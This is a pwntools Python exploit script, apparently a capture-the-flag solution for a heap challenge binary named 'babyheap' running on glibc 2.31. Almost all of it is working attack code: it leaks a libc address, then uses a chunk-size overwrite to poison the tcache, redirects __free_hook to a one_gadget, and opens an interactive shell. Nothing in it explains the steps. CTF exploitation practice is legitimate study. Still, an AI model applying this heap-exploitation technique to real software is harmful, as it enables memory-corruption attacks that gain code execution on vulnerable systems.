from pwn import *


def malloc(size,content):
    p.sendlineafter("Command:\n> ",b"M")
    p.sendlineafter("Size:\n> ",str(size) if size != -1 else str(len(content)))
    p.sendlineafter("Content:\n> ",content)
def free(idx):
    p.sendlineafter("Command:\n> ",b"F")
    p.sendlineafter("\n> ",str(idx))
def show(idx):
    p.sendlineafter("Command:\n> ",b"S")
    p.sendlineafter("\n> ",str(idx))
    return p.recvline()


elf = context.binary = ELF("./babyheap")
env = {}
env["LD_PRELOAD"] = "./2.31-0ubuntu9.16_amd64/libc.so.6"
p = process(env=env)
libc = elf.libc

# libc leak
for i in range(10):
   malloc(0xf8,f"{i}".encode() * 0xf8)

for i in range(0,8):
    free(i)
free(8)

for i in range(8):
   malloc(0xf8,f"".encode() * 0xf8)


LEAK = show(7)[:6]
LEAK = u64(LEAK + b"\x00" * (8 - len(LEAK)))
libc.address = LEAK - 0x1ecdd0

# reset heap
for i in range(8):
    free(i)
free(9)

# tcach attack
for i in range(10):
   malloc(0xf8,f"{i}".encode() * 0xf8)
free(1)
malloc(0xf8,f"@".encode() * 0xf8 + b"\x81")
free(1) # ?
free(2)
free(3)
malloc(0x178,f"A".encode() * 0x100 + p64(libc.sym["__free_hook"])[:6])
malloc(0xf8,"")
malloc(0xf8,p64(libc.address +  0xe3b01)[:6])
free(4)

# gdb.attach(p)







p.interactive()
